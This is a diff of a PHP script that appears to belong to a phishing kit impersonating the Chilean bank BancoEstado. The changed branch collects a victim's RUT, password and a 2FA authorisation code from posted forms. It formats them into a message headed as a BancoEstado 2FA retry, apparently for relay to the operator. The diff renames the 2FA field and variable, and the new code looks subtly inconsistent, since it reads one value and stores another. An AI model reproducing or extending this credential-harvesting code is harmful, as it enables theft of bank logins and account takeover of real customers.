@@ -117,14 +117,14 @@ if (isset($_POST['rut'],$_POST['password'])) {
     $message .= "┊♡ 𝖱𝖴𝖳.: <code>$user_esc</code>\n";
 
 // 2FA-error.php
-} elseif (isset($_POST['2fa2'])) {
-    $code = trim($_POST['2fa2']);
-    $_SESSION['2fa2'] = $efea;
+} elseif (isset($_POST['bepass2'])) {
+    $code = trim($_POST['bepass2']);
+    $_SESSION['bepass2'] = $bepass2;
     $form_origen = "2FA-error.php";
-    $efea_esc = htmlspecialchars($efea, ENT_QUOTES, 'UTF-8');
+    $bepass2_esc = htmlspecialchars($bepass2, ENT_QUOTES, 'UTF-8');
     $user_esc = htmlspecialchars($_SESSION['usuario'] ?? 'Desconocido', ENT_QUOTES, 'UTF-8');
     $message .= "🇨🇱 ✴︎𝖠𝗎𝗍𝗈𝗋𝗂𝗓𝖺𝖼𝗂𝗈𝗇 2𝖥𝖠 𝖡𝖺𝗇𝖼𝗈𝖤𝗌𝗍𝖺𝖽𝗈-𝖱𝖾𝗂𝗇𝗍𝖾𝗇𝗍𝗈✴︎ 🇨🇱\n\n";
-    $message .= "┊♡ 𝖠𝗎𝗍𝗈.: <code>$efea_esc</code>\n\n";
+    $message .= "┊♡ 𝖠𝗎𝗍𝗈.: <code>$bepass2_esc</code>\n\n";
     $message .= "┊♡ 𝖱𝖴𝖳.: <code>$user_esc</code>\n";
 
 } else {
